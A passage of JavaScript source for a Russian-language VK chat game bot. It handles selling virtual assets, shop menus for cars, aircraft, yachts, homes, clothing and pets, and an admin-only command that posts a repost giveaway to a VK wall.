		message.user.balance += Math.floor(apartments[message.user.realty.apartment - 1].cost * 0.85);
		message.user.realty.apartment = 0;

		return bot(`вы продали свою квартиру за ${utils.sp(a)}$`);
	}

	if(/телефон/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.misc.phone) return bot(`❗у вас нет телефона`);
		let a = Math.floor(phones[message.user.misc.phone - 1].cost * 0.85);

		message.user.balance += Math.floor(phones[message.user.misc.phone - 1].cost * 0.85);
		message.user.misc.phone = 0;

		return bot(`вы продали свой телефон за ${utils.sp(a)}$`);
	}

	if(/ферм/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.misc.farm) return bot(`❗у вас нет фермы`);
		let a = Math.floor(farms[message.user.misc.farm - 1].cost * 0.85);

		message.user.balance += Math.floor(farms[message.user.misc.farm - 1].cost * 0.85);
		message.user.misc.farm = 0;

		return bot(`вы продали свою ферму за ${utils.sp(a)}$`);
	}

	if(/рейтинг/i.test(message.args[1].toLowerCase()))
	{
		if(options.count > message.user.rating) return bot(`❗у вас нет рейтинга`);
		let a = (25 * options.count);

		message.user.balance += Math.floor(a);
		message.user.rating -= options.count;

		return bot(`вы продали ${options.count} ${utils.decl(options.count, ['рейтинг', 'рейтинга', 'рейтингов'])} за ${utils.sp(Math.floor(a))}`);
	}

	if(/руда|руду/i.test(message.args[1].toLowerCase()))
	{
		if(options.count > message.user.ryuda) return bot(`❗У вас нет руды`);
		let a = (2 * options.count);

		message.user.balance += Math.floor(a);
		message.user.ryuda -= options.count;

		return bot(`[🎛]Вы продали ${options.count} ${utils.decl(options.count, ['руды', 'руды', 'руды'])} за ${utils.sp(Math.floor(a))}$`);
	}

	if(/бизнес/i.test(message.args[1].toLowerCase()))
	{
		if(!message.user.business) return bot(`❗у вас нет бизнеса`);
		let a = Math.floor(businesses[message.user.business - 1].cost * 0.85);

		message.user.balance += Math.floor(a);
		message.user.business = 0;

		return bot(`вы продали свой бизнес за ${utils.sp(a)}$`);
	}

	if(/биткоин/i.test(message.args[1].toLowerCase()))
	{
		if(options.count > message.user.btc) return bot(`❗недостаточно биткоинов`);
		let a = Math.floor(btc * options.count);

		message.user.balance += Math.floor(a);
		message.user.btc -= options.count;

		return bot(`вы продали ${options.count}₿ за ${utils.sp(a)}$`);
	}
});


cmd.hear(/^(?:машины|машина)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`машины: 
${message.user.transport.car === 1 ? '🚗' : '🚗'} 1. Самокат (5$)
${message.user.transport.car === 2 ? '🚗' : '🚗'} 2. Велосипед (25$)
${message.user.transport.car === 3 ? '🚗' : '🚗'} 3. Гироскутер (50$)
${message.user.transport.car === 4 ? '🚗' : '🚗'} 4. Сегвей (75$)
${message.user.transport.car === 5 ? '🚗' : '🚗'} 5. Мопед (25$)
${message.user.transport.car === 6 ? '🚗' : '🚗'} 6. Мотоцикл (50$)
${message.user.transport.car === 7 ? '🚗' : '🚗'} 7. ВАЗ 2109 (75$)
${message.user.transport.car === 8 ? '🚗' : '🚗'} 8. Квадроцикл (80$)
${message.user.transport.car === 9 ? '🚗' : '🚗'} 9. Багги (135$)
${message.user.transport.car === 10 ? '🚗' : '🚗'} 10. Вездеход (200$)
${message.user.transport.car === 11 ? '🚗' : '🚗'} 11. Лада Xray (350$)
${message.user.transport.car === 12 ? '🚗' : '🚗'} 12. Audi Q7 (750$)
${message.user.transport.car === 13 ? '🚗' : '🚗'} 13. BMW X6 (1000$)
${message.user.transport.car === 14 ? '🚗' : '🚗'} 14. Toyota FT-HS (1050$)
${message.user.transport.car === 15 ? '🚗' : '🚗'} 15. BMW Z4 M (1100$)
${message.user.transport.car === 16 ? '🚗' : '🚗'} 16. Subaru WRX STI (1150$)
${message.user.transport.car === 17 ? '🚗' : '🚗'} 17. Lamborghini Veneno (1350$)
${message.user.transport.car === 18 ? '🚗' : '🚗'} 18. Tesla Roadster (1400$)
${message.user.transport.car === 19 ? '🚗' : '🚗'} 19. Yamaha YZF R6 (1450$)
${message.user.transport.car === 20 ? '🚗' : '🚗'} 20. Bugatti Chiron (1550$)
${message.user.transport.car === 21 ? '🚗' : '🚗'} 21. Thrust SSC (1650$)
${message.user.transport.car === 22 ? '🚗' : '🚗'} 22. Ferrari LaFerrari (1750$)
${message.user.transport.car === 23 ? '🚗' : '🚗'} 23. Koenigsegg Regera (1850$)
${message.user.transport.car === 24 ? '🚗' : '🚗'} 24. Tesla Semi (1950$)
${message.user.transport.car === 25 ? '🚗' : '🚗'} 25. Venom GT (2000$)
${message.user.transport.car === 26 ? '🚗' : '🚗'} 26. Rolls-Royce (2300$)
${message.user.transport.car === 27 ? '🚗' : '🚗'} 27. Вишневая Семерка (200$)
${message.user.transport.car === 28 ? '🚗' : '🚗'} 28. BMW X5 (500$)
${message.user.transport.car === 29 ? '🚗' : '🚗'} 29. Devel Sixteen  (2500$)
${message.user.transport.car === 30 ? '🚗' : '🚗'} 30. Лошадь (100$)
${message.user.transport.car === 31 ? '🚗' : '🚗'} 31. Toyota Celica (2000$)
${message.user.transport.car === 32 ? '🚗' : '🚗'} 32. Honda Civic (2200$)

Для покупки введите "Машина [номер]"`);

	const sell = cars.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.car) return bot(`❗❗У вас уже есть машина (${cars[message.user.transport.car - 1].name}), введите "Продать машину"`);

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.car = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});


cmd.hear(/^(?:фермы)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`Майнинг фермы: 
${message.user.misc.farm === 1 ? '🚣' : '🚣'} 1. 6U Nvidia 1฿/час (30000$)
${message.user.misc.farm === 2 ? '🚣' : '🚣'} 2. AntminerS9 2฿/час (50000$)
${message.user.misc.farm === 3 ? '🚣' : '🚣'} 3. FM2018-BT200 3฿/час (60000$)
${message.user.misc.farm === 4 ? '🚣' : '🚣'} 4. Шахта с биткоинами 4฿/час (70000$)
${message.user.misc.farm === 5 ? '🚣' : '🚣'} 5. Планета с биткоинами 5฿/час (100000$)

Для покупки введите "Фермы [номер]"`);

	const sell = farms.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.misc.farm = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:квадрокоптер|квадрокоптеры)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`Квадрокоптеры: 
${message.user.transport.copter === 1 ? '🚡' : '🚡'} 1. Hubsan X4  (30$)
${message.user.transport.copter === 2 ? '🚡' : '🚡'} 2. Sima X5C  (35$)
${message.user.transport.copter === 3 ? '🚡' : '🚡'} 3. DJI phantom 3  (40$)
${message.user.transport.copter === 4 ? '🚡' : '🚡'} 4. FPV mt2204  (50$)
${message.user.transport.copter === 5 ? '🚡' : '🚡'} 5. vk.com/roman_akular COPTER  (100$)

Для покупки введите "Квадрокоптеры [номер]"`);

	const sell = copters.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.copter) return bot(`❗❗У вас уже есть квадрокоптер(${copters[message.user.transport.copter - 1].name}), введите "Продать квадрокоптеры"`);

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.copter = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:телевизор|телевизоры)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`телевизоры: 
${message.user.transport.telik === 1 ? '📺' : '📺'} 1. Samsung UE43N5300AUXCE (3$)
${message.user.transport.telik === 2 ? '📺' : '📺'} 2. Haier LE32K5500T  (25$)
${message.user.transport.telik === 3 ? '📺' : '📺'} 3. LG 43LK5400  (35$)
${message.user.transport.telik === 4 ? '📺' : '📺'} 4. TCL 32S62 (20$)
${message.user.transport.telik === 5 ? '📺' : '📺'} 5. Artel 32AH90G (55$)
${message.user.transport.telik === 6 ? '📺' : '📺'} 6. Sony KDL-40WD653  (40$)
${message.user.transport.telik === 7 ? '📺' : '📺'} 7. Elenberg LD32A12GS338  (15$)
${message.user.transport.telik === 8 ? '📺' : '📺'} 8. Toshiba 32L5780EC  (60$)
${message.user.transport.telik === 9 ? '📺' : '📺'} 9. Philips 32PHS5302 (45$)
${message.user.transport.telik === 10 ? '📺' : '📺'} 10. ERGO LE43СU6500AK  (45$)

Для покупки введите "Телевизоры [номер]"`);

	const sell = teliks.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.telik) return bot(`❗❗У вас уже есть телевизор(${teliks[message.user.transport.telik - 1].name}), введите "Продать телевизор"`);

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.telik = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:Голова|головы)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`Головы для персонажа: 
${message.user.transport.golova === 1 ? '😎' : '😎'} 1.  Крутой  (0$)
${message.user.transport.golova === 2 ? '😡' : '😡'} 2.  Злой    (10$)
${message.user.transport.golova === 3 ? '👽' : '👽'} 3.  Инопланетянин  (20$)
${message.user.transport.golova === 4 ? '😇' : '😇'} 4.  Ангел   (30$)
${message.user.transport.golova === 5 ? '☹' : '☹'} 5.  Грустный  (40$)
${message.user.transport.golova === 6 ? '👺' : '👺'} 6.  Дьявол  (50$)
${message.user.transport.golova === 7 ? '👮' : '👮'} 7.  Полицейский  (60$)
${message.user.transport.golova === 8 ? '🤓' : '🤓'} 8.  Батаник  (70$)
${message.user.transport.golova === 9 ? '🤠' : '🤠'} 9.  Ковбой  (80$)
${message.user.transport.golova === 10 ? '😈' : '😈'} 10.  Дьявол(2) (100$)

Для покупки введите "Голова [номер]"`);

	const sell = golovas.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.golova) return bot(`❗❗У вашего персонажа уже есть голова.(${golovas[message.user.transport.golova- 1].name}), введите "Продать голова"`);

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.golova = sell.id;

		return bot(`Вы купили голову: "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});


cmd.hear(/^(?:Рубашка|Рубашки)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`Рубашки: 
${message.user.transport.rubahka === 1 ? '👔' : '👔'} 1.Leviton (0$)
${message.user.transport.rubahka === 2 ? '👕' : '👕'} 2.Gucci (500$)
Для покупки введите "Рубашка [номер]"`);

	const sell = rubahkas.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.rubahka) return bot(`❗❗У вашего персонажа уже есть рубашка.(${rubahkas[message.user.transport.rubahka- 1].name}), введите "Продать рубашка"`);

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.rubahka = sell.id;

		return bot(`вы купили рубашку: "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:Обувь|Ботинки)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`Обувь: 
${message.user.transport.obyv === 1 ? '👞' : '👞'} 1. Классика  (0$)
${message.user.transport.obyv === 2 ? '👟' : '👟'} 1. Спортивные кроссовки  (30$)
Для покупки введите "Обувь [номер]"`);

	const sell = obyvs.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.obyv) return bot(`❗❗У вашего персонажа уже есть обувь.(${obyvs[message.user.transport.obyv- 1].name}), введите "Продать обувь"`);

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.obyv = sell.id;

		return bot(`Вы купили обувь: "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:фотоаппарат|фотоаппараты)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`фотоаппараты: 
${message.user.transport.fotik === 1 ? '📷' : '📷'} 1. Nikon D5600 Kit  (30$)
${message.user.transport.fotik === 2 ? '📷' : '📷'} 2. Sony Alpha ILCE-6300  (40$)
${message.user.transport.fotik === 3 ? '📷' : '📷'} 3. Canon PowerShot SX420  (10$)
${message.user.transport.fotik === 4 ? '📷' : '📷'} 4. Fujifilm FinePix XP130  (10$)
${message.user.transport.fotik === 5 ? '📷' : '📷'} 5. Samsung Galaxy NX  (20$)

Для покупки введите "фотоаппарат [номер]"`);

	const sell = fotiks.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.fotik) return bot(`❗❗У вас уже есть фотоаппарат(${fotiks[message.user.transport.fotik- 1].name}), введите "Продать фотоаппарат"`);

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.fotik = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:Камера|камеры)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`Камеры: 
${message.user.transport.cam === 1 ? '📽' : '📽'} 1. EOS 5DS R  (10$)

Для покупки введите "Камеры [номер]"`);

	const sell = cams.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.cam) return bot(`❗У вас уже есть камера(${cams[message.user.transport.cam- 1].name}), введите "Продать камеру"`);

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.cam = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:Питомец|Питомцы)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`Питомцы: 
${message.user.transport.pitom === 1 ? '🐓' : '🐓'} 1.Ленивец  (0$)
${message.user.transport.pitom === 2 ? '🐓' : '🐓'} 2.Кошка    (30$)
${message.user.transport.pitom === 3 ? '🐓' : '🐓'} 3.Собака   (50$)
${message.user.transport.pitom === 4 ? '🐓' : '🐓'} 4.Куриц    (60$)
${message.user.transport.pitom === 5 ? '🐓' : '🐓'} 5.Тигр     (70$)
${message.user.transport.pitom === 6 ? '🐓' : '🐓'} 6.Дракон   (80$)
${message.user.transport.pitom === 7 ? '🐓' : '🐓'} 7.Лошадь   (10$)

Для покупки введите "Питомец [номер]"`);

	const sell = pitoms.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.pitom) return bot(`❗❗У вас уже есть питомец (${pitoms[message.user.transport.pitom- 1].name}), введите "Продать питомец"`);

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.pitom = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:Шляпа|Шляпы)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`Шляпы: 
${message.user.transport.shlapa === 1 ? '👒' : '👒'} 1. Панама  (30$)
${message.user.transport.shlapa === 2 ? '🎩' : '🎩'} 2. Цилиндр  (130$)
${message.user.transport.shlapa === 3 ? '🎓' : '🎓'} 3. Ученик  (150$)
${message.user.transport.shlapa === 4 ? '👑' : '👑'} 4. Корона  (300$)
${message.user.transport.shlapa === 5 ? '⛑' : '⛑'} 5. Каска  (500$)

Для покупки введите "Шляпы [номер]"`);

	const sell = shlapas.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.shlapa) return bot(`❗❗У вашего персонажа уже есть шляпа(${shlapas[message.user.transport.shlapa - 1].name}), введите "Продать шляпа"`);

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.shlapa = sell.id;

		return bot(`Вы купили шляпу: "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:мотоцикл|мотоциклы)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`мотоциклы: 
${message.user.transport.moto === 1 ? '🛵' : '🛵'} 1. Faggio  (100$)
${message.user.transport.moto === 2 ? '🛵' : '🛵'} 2. Freeway (500$)
${message.user.transport.moto === 3 ? '🛵' : '🛵'} 3. PCJ-500 (500$)
${message.user.transport.moto === 4 ? '🛵' : '🛵'} 4. BF-400  (100$)
${message.user.transport.moto === 5 ? '🛵' : '🛵'} 5. NRG-500 (500$)
${message.user.transport.moto === 6 ? '🛵' : '🛵'} 6. HPV-500 (1000$)

Для покупки введите "Мотоцикл [номер]"`);

	const sell = motos.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.moto) return bot(`❗❗У вас уже есть мотоцикл(${motos[message.user.transport.moto - 1].name}), введите "Продать мотоцикл"`);

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.moto = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:планшет|планшеты)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`Планшеты: 
${message.user.transport.table === 1 ? '💻' : '💻'} 1. Samsung Galaxy Tab E  (30$)
${message.user.transport.table === 2 ? '💻' : '💻'} 2. Lenovo TAB 4 (50$)
${message.user.transport.table === 3 ? '💻' : '💻'} 3. Huawei T3 (80$)
${message.user.transport.table === 4 ? '💻' : '💻'} 4. Apple iPad Cellular (10$)
${message.user.transport.table === 5 ? '💻' : '💻'} 5. Prestigio PMT3157 (10$)
${message.user.transport.table === 6 ? '💻' : '💻'} 6. Huawei M5 LITE (80$)

Для покупки введите "Планшеты [номер]"`);

	const sell = tables.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.table) return bot(`❗У вас уже есть планшет(${tables[message.user.transport.table - 1].name}), введите "Продать планшет"`);

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.table = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:яхты|яхта)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`яхты: 
${message.user.transport.yacht === 1 ? '🛥' : '🛥'} 1. Ванна (100$)
${message.user.transport.yacht === 2 ? '🛥' : '🛥'} 2. Nauticat 331 (1000$)
${message.user.transport.yacht === 3 ? '🛥' : '🛥'} 3. Nordhavn 56 MS (1500$)
${message.user.transport.yacht === 4 ? '🛥' : '🛥'} 4. Princess 60 (2500$)
${message.user.transport.yacht === 5 ? '🛥' : '🛥'} 5. Azimut 70 (3500$)
${message.user.transport.yacht === 6 ? '🛥' : '🛥'} 6. Dominator 40M (5000$)
${message.user.transport.yacht === 7 ? '🛥' : '🛥'} 7. Moonen 124 (6000$)
${message.user.transport.yacht === 8 ? '🛥' : '🛥'} 8. Wider 150 (6500$)
${message.user.transport.yacht === 9 ? '🛥' : '🛥'} 9. Palmer Johnson 42M SuperSport (8000$)
${message.user.transport.yacht === 10 ? '🛥' : '🛥'} 10. Wider 165 (8500$)
${message.user.transport.yacht === 11 ? '🛥' : '🛥'} 11. Eclipse (15000$)
${message.user.transport.yacht === 12 ? '🛥' : '🛥'} 12. Dubai (30000$)
${message.user.transport.yacht === 13 ? '🛥' : '🛥'} 13. Streets of Monaco (75000$)

Для покупки введите "Яхта [номер]"`);

	const sell = yachts.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.yacht) return bot(`❗У вас уже есть яхта (${yachts[message.user.transport.yacht - 1].name}), введите "Продать яхту"`);

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.yacht = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});


cmd.hear(/^(?:самол(?:е|ё)т|самол(?:е|ё)ты)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`самолеты: 
${message.user.transport.airplane === 1 ? '🛩' : '🛩'} 1. Параплан (1000$)
${message.user.transport.airplane === 2 ? '🛩' : '🛩'} 2. АН-2 (3500$)
${message.user.transport.airplane === 3 ? '🛩' : '🛩'} 3. Cessna-172E (7000$)
${message.user.transport.airplane === 4 ? '🛩' : '🛩'} 4. Supermarine Spitfire (10000$)
${message.user.transport.airplane === 5 ? '🛩' : '🛩'} 5. BRM NG-5 (14000$)
${message.user.transport.airplane === 6 ? '🛩' : '🛩'} 6. Cessna T210 (26000$)
${message.user.transport.airplane === 7 ? '🛩' : '🛩'} 7. Beechcraft 1900D (55000$)
${message.user.transport.airplane === 8 ? '🛩' : '🛩'} 8. Cessna 550 (80000$)
${message.user.transport.airplane === 9 ? '🛩' : '🛩'} 9. Hawker 4000 (224000$)
${message.user.transport.airplane === 10 ? '🛩' : '🛩'} 10. Learjet 31 (45000$)
${message.user.transport.airplane === 11 ? '🛩' : '🛩'} 11. Airbus A318 (85000$)
${message.user.transport.airplane === 12 ? '🛩' : '🛩'} 12. F-35A (160000$)
${message.user.transport.airplane === 13 ? '🛩' : '🛩'} 13. Boeing 747-430 Custom (225000$)
${message.user.transport.airplane === 14 ? '🛩' : '🛩'} 14. C-17A Globemaster III (350000$)
${message.user.transport.airplane === 15 ? '🛩' : '🛩'} 15. F-22 Raptor (40000$)
${message.user.transport.airplane === 16 ? '🛩' : '🛩'} 16. Airbus 380 Custom (60000$)
${message.user.transport.airplane === 17 ? '🛩' : '🛩'} 17. B-2 Spirit Stealth Bomber (1000000$)

Для покупки введите "Самолет [номер]"`);

	const sell = airplanes.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.airplane) return bot(`❗У вас уже есть самолёт (${airplanes[message.user.transport.airplane - 1].name}), введите "Продать самолёт"`);

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.airplane = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:вертол(?:е|ё)т|вертол(?:е|ё)ты)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`вертолеты: 
${message.user.transport.helicopter === 1 ? '🚁' : '🚁'} 1. Шарик с пропеллером (20$)
${message.user.transport.helicopter === 2 ? '🚁' : '🚁'} 2. RotorWay Exec 162F (300$)
${message.user.transport.helicopter === 3 ? '🚁' : '🚁'} 3. Robinson R44 (450$)
${message.user.transport.helicopter === 4 ? '🚁' : '🚁'} 4. Hiller UH-12C (130$)
${message.user.transport.helicopter === 5 ? '🚁' : '🚁'} 5. AW119 Koala (250$)
${message.user.transport.helicopter === 6 ? '🚁' : '🚁'} 6. MBB BK 117 (400$)
${message.user.transport.helicopter === 7 ? '🚁' : '🚁'} 7. Eurocopter EC130 (750$)
${message.user.transport.helicopter === 8 ? '🚁' : '🚁'} 8. Leonardo AW109 Power (1000$)
${message.user.transport.helicopter === 9 ? '🚁' : '🚁'} 9. Sikorsky S-76 (1500$)
${message.user.transport.helicopter === 10 ? '🚁' : '🚁'} 10. Bell 429WLG (1900$)
${message.user.transport.helicopter === 11 ? '🚁' : '🚁'} 11. NHI NH90 (3500$)
${message.user.transport.helicopter === 12 ? '🚁' : '🚁'} 12. Kazan Mi-35M (6000$)
${message.user.transport.helicopter === 13 ? '🚁' : '🚁'} 13. Bell V-22 Osprey (13500$)

Для покупки введите "Вертолет [номер]"`);

	const sell = helicopters.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.transport.helicopter) return bot(`❗У вас уже есть вертолёт (${homes[message.user.transport.helicopter - 1].name}), введите "Продать вертолёт"`);

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.transport.helicopter = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});


cmd.hear(/^(?:дом|дома)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`дома: 
${message.user.realty.home === 1 ? '🏠' : '🏠'} 1. Коробка из-под холодильника (250$)
${message.user.realty.home === 2 ? '🏠' : '🏠'} 2. Подвал (300$)
${message.user.realty.home === 3 ? '🏠' : '🏠'} 3. Палатка (350$)
${message.user.realty.home === 4 ? '🏠' : '🏠'} 4. Домик на дереве (500$)
${message.user.realty.home === 5 ? '🏠' : '🏠'} 5. Полуразрушенный дом (700$)
${message.user.realty.home === 6 ? '🏠' : '🏠'} 6. Дом в лесу (900$)
${message.user.realty.home === 7 ? '🏠' : '🏠'} 7. Деревянный дом (1050$)
${message.user.realty.home === 8 ? '🏠' : '🏠'} 8. Дача (1250$)
${message.user.realty.home === 9 ? '🏠' : '🏠'} 9. Кирпичный дом (1350$)
${message.user.realty.home === 10 ? '🏠' : '🏠'} 10. Коттедж (1400$)
${message.user.realty.home === 11 ? '🏠' : '🏠'} 11. Особняк (1500$)
${message.user.realty.home === 12 ? '🏠' : '🏠'} 12. Дом на Рублёвке (1800$)
${message.user.realty.home === 13 ? '🏠' : '🏠'} 13. Личный небоскрёб (1900$)
${message.user.realty.home === 14 ? '🏠' : '🏠'} 14. Остров с особняком (1999$)
${message.user.realty.home === 15 ? '🏠' : '🏠'} 15. Белый дом (2500$)
${message.user.realty.home === 16 ? '🏠' : '🏠'} 16. Черный дом (3000$)
${message.user.realty.home === 17 ? '🏠' : '🏠'} 17. Дом на мольдивах (3200$)
${message.user.realty.home === 18 ? '🏠' : '🏠'} 18. Дом в джунглях (4000$)

Для покупки введите "Дом [номер]"`);

	const sell = homes.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.realty.home) return bot(`❗У вас уже есть дом (${homes[message.user.realty.home - 1].name}), введите "Продать дом"`);

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.realty.home = sell.id;
		message.user.questwin5 += 2;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:квартира|квартиры)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`квартиры: 
${message.user.realty.apartment === 1 ? '🌇' : '🌇'} 1. Чердак (15.000$)
${message.user.realty.apartment === 2 ? '🌇' : '🌇'} 2. Квартира в общежитии (55.000$)
${message.user.realty.apartment === 3 ? '🌇' : '🌇'} 3. Однокомнатная квартира (175.000$)
${message.user.realty.apartment === 4 ? '🌇' : '🌇'} 4. Двухкомнатная квартира (260.000$)
${message.user.realty.apartment === 5 ? '🌇' : '🌇'} 5. Четырехкомнатная квартира (500.000$)
${message.user.realty.apartment === 6 ? '🌇' : '🌇'} 6. Квартира в центре Москвы (1.600.000$)
${message.user.realty.apartment === 7 ? '🌇' : '🌇'} 7. Двухуровневая квартира (4.000.000$)
${message.user.realty.apartment === 8 ? '🌇' : '🌇'} 8. Квартира с Евроремонтом (6.000.000$)

Для покупки введите "Квартира [номер]"`);

	const sell = apartments.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.realty.apartment) return bot(`❗У вас уже есть квартира (${apartments[message.user.realty.apartment - 1].name}), введите "Продать квартиру"`);

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.realty.apartment = sell.id;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});


cmd.hear(/^(?:раздача)$/i, async (message, bot) => {
	if(message.senderId !== 324503169) return;
	if(giving) return bot(`серьёзно? СЕРЬЁЗНО?! Создавать по 500 постов с раздачей я также не могу. Пойди посмотри канал "Тарелка"`);
	giving = true;
	user.api.wall.post({
		owner_id: 175499493,
		message: `⚡ >> Проводим раздачу, сделай репост и получи 5.000.000$ на свой баланс! 

		🚧 >> Перед тем, как репостить, напишите любое сообщение в ЛС сообществу. Так же необходимо, чтобы у Вас был открыт профиль. 

		⏰ || Внимание! Раздача будет проходить 2 часа!.`,
		attachments: 'photo-174226458_456239120'
	}).then((response) => {
		user.api.wall.createComment({
			owner_id: 175499493,
			post_id: response.post_id,
			from_group: 1,
			message: '* деньги на баланс будут выданы по окончанию акции.'
		});
		user.api.wall.closeComments({
			owner_id:175499493,
			post_id: response.post_id
		});
		setTimeout(() => {
			user.api.call('wall.getReposts', { owner_id: 175499493, post_id: response.post_id, count: 3000 }).then((res) => { 
				res.items.map(x=> {
					if(x.from_id < 0) return;
